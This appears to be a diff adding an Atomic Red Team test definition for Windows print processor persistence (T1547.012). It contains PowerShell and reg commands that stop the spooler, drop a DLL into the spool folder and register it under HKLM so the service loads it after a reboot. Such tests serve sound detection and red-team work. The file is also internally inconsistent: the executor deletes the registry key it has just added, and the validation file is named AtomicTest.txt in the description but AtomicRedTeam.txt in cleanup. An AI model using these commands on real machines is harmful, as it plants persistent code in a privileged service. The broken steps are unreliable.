@@ -1,0 +1,36 @@
+attack_technique: T1547.012
+display_name: 'Boot or Logon Autostart Execution: Print Processors'
+atomic_tests:
+- name: Print Processors
+  description: |
+    Establishes persistence by creating a new print processor registry key under HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Print\Environments\Windows x64\Print Processors.
+    The new print processor will point to a DLL which will be loaded by the spooler service after a reboot. The DLL will then create the file AtomicTest.txt in C:\Users\Public\ as validation that the test is successful.
+
+    Note: The test assumes a x64 Windows operating system.
+
+    The payload source code is based on a blog post by stmxcsr: [https://stmxcsr.com/persistence/print-processor.html](https://stmxcsr.com/persistence/print-processor.html)
+  supported_platforms:
+  - windows
+  input_arguments:
+    restart:
+      description: set to 1 if you want the computer to reboot as part of the test
+      type: integer
+      default: 0
+  executor:
+    command: |
+      net stop spooler
+      Copy-Item $PathToAtomicsFolder\T1547.012\bin\PrintProcessor.dll C:\Windows\System32\spool\prtprocs\x64\PrintProcessor.dll
+      reg add "HKLM\SYSTEM\CurrentControlSet\Control\Print\Environments\Windows x64\Print Processors\AtomicRedTeam" /v "Driver" /d "PrintProcessor.dll" /t REG_SZ /f
+      reg delete "HKLM\SYSTEM\CurrentControlSet\Control\Print\Environments\Windows x64\Print Processors\AtomicRedTeam" /f >nul 2>&1
+      net start spooler
+      if(#{restart}){
+        Restart-Computer
+      }
+    cleanup_command: |
+      net stop spooler
+      rm -force C:\Windows\System32\spool\prtprocs\x64\PrintProcessor.dll
+      rm -force C:\Users\Public\AtomicRedTeam.txt
+      reg delete "HKLM\SYSTEM\CurrentControlSet\Control\Print\Environments\Windows x64\Print Processors\AtomicRedTeam" /f >nul 2>&1
+      net start spooler
+    name: powershell
+    elevation_required: true
